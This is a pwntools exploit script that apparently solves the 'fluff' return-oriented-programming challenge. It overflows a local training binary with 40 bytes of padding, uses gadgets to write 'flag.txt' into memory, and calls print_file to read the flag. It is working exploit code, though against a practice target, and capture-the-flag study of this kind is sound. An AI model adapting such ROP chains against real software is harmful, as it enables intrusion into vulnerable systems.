from pwn import *
r=process('./fluff')
# gdb.attach(r, """break *0x00000000004005e8""")
poprdi=0x00000000004006a3
addrbp3debx=0x00000000004005e8 #add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
poprbxrbp=0x000000000040069a #pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
write_addr=0x00601028
print_file=0x0000000000400510
payload="a"*40
#write
payload+=p64(poprbxrbp)+p64(u32('flag'))+p64(write_addr+0x3d)+p64(0)*4+p64(addrbp3debx)
payload+=p64(poprbxrbp)+p64(u32('.txt'))+p64(write_addr+0x3d+4)+p64(0)*4+p64(addrbp3debx)
payload+=p64(poprdi)+p64(write_addr)+p64(print_file)
r.recvuntil('> ')
r.sendline(payload)
r.interactive()